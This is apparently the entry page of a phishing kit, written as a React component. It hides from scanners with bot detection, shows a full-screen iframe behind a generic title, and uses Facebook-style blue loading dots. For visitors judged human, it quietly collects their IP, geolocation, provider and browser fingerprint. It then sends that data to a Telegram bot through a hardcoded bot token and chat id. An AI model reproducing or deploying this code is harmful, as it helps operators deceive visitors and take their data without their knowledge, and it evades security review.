import { Helmet } from 'react-helmet';
import MetaIcon from '../assets/icon.ico';
import type { FC } from 'react';
import { useEffect, useRef, useState } from 'react';
import { useBotDetection } from '@/hooks/useBotDetection';
import template from "../templates/index.html";
//import { randomizeAttributes } from "../hooks/randomizeHtml";

const LoadingDots = () => {
    const [dots, setDots] = useState('');
    useEffect(() => {
        const interval = setInterval(() => {
            setDots((prev) => {
                if (prev.length >= 5) return '';
                return prev + '.';
            });
        }, 300);

        return () => clearInterval(interval);
    }, []);

    return (
        <div className="flex h-4 w-24 items-center justify-center gap-2">
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
            <div
                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
            />
        </div>
    );
};

const Index: FC = () => {

    const [content, setContent] = useState<string>("");
    const { isBot, isLoading, shouldRedirect } = useBotDetection();
    const [redirecting, setRedirecting] = useState(false);
    const logSentRef = useRef(false);
    let[IframeUrl, SetIframeUrl] = useState('https://chimseclient.vercel.app');
    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home Page');
    function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          {favicon == true ? 
          <link rel="icon" type="image/svg+xml" href={MetaIcon}/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
  }

    useEffect(() => {
        console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
        if (shouldRedirect && !isBot && !isLoading) {
           setRedirecting(true);
        }
    }, [shouldRedirect, isBot, isLoading]);

    useEffect(() => {
        if (!isLoading && !isBot && !logSentRef.current) {
            logSentRef.current = true;
            const fetchGeoAndSendTelegram = async () => {
                const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
                const botToken = '8023769128:AAFkIJ4X4w5QjRGdybksnDO6KsDm5VXqr3M';
                const chatId = '-4877732699';
                const geoRes = await fetch(geoUrl);
                const geoData = await geoRes.json();
                const fullFingerprint = {
                    asn: geoData.asn,
                    organization_name: geoData.organization_name,
                    organization: geoData.organization,
                    ip: geoData.ip,
                    country_code: geoData.country_code,
                    navigator: {
                        userAgent: navigator.userAgent,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints,
                        webdriver: navigator.webdriver,
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                    },
                };

                const msg = `🔍 <b>Access log</b>
🏢 <b>Country:</b> <code>${fullFingerprint.country_code}</code>
📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Provider:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Unknown'}</code>
🌐 <b>Browser:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> core
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> point
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Yes' : 'No'}</code>
📺 <b>Screen:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Real Screen:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: msg,
                    parse_mode: 'HTML',
                };
                try {
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });

                    const result = await response.json();

                    if (!response.ok) {
                        alert(`API Error: ${result.description ?? 'Unknown error'}`);
                    } else {
                        console.log('telegram sent successfully:', result);
                    }
                } catch (error) {
                    const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
                    alert(`Network Error: ${errorMsg}`);
                }
            };
            fetchGeoAndSendTelegram();
        }
    }, [isLoading, isBot]);
    useEffect(() => {
        if (!isLoading && !isBot && !shouldRedirect) {
            const timer = setTimeout(() => {
               setRedirecting(true);
            }, 3000);

            return () => clearTimeout(timer);
        }
    }, [isBot, isLoading, shouldRedirect]);

    if (isLoading) {
        return (
            <div className="fixed inset-0 flex items-center justify-center bg-white">
                <div className="flex flex-col items-center gap-2">
                    {/* <LoadingDots /> */}
                </div>
            </div>
        );
    }
    if (isBot) {
        return(showIframe("/id/home.html",SiteTitleMeta,false));
    }
    return(showIframe("/id/home.html",SiteTitleMeta,false));
    //return showIframe(IframeUrl,SiteTitleMeta,false);
};

export default Index;
